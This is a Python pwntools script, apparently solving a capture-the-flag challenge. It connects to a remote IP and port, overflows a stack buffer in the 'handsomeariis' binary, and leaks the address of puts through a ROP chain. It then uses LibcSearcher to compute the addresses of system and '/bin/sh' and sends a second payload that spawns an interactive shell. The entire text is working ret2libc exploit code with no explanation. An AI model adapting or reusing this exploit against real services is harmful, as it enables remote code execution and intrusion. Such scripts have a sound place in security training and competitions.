from pwn import *
from LibcSearcher import LibcSearcher

# p = process("./handsomeariis")
p = remote("118.24.3.214" , 11002)
elf = ELF("./handsomeariis")

pop_rdi = 0x0000000000400873
payload = "Aris so handsoooome!\x00"
payload = payload.ljust(0x20 , "a") + "b" * 8
payload += p64(pop_rdi) + p64(elf.got["puts"]) + p64(elf.plt["puts"]) + p64(0x400735)

p.sendlineafter("Repeat me!" , payload)
p.recvuntil("Great! Power upupuppp!\n")
puts_addr = u64(p.recvuntil("\x7f").ljust(8 , "\x00"))
libc = LibcSearcher("puts" , puts_addr)
libc_base = puts_addr - libc.dump("puts")
system = libc_base + libc.dump("system")
str_bin_sh = libc_base + libc.dump("str_bin_sh")
# __________________________________________________
payload = "Aris so handsoooome!\x00"
payload = payload.ljust(0x20 , "a") + "b" * 8
payload += p64(pop_rdi) + p64(str_bin_sh) + p64(system)

p.sendlineafter("Repeat me!" , payload)
p.interactive()


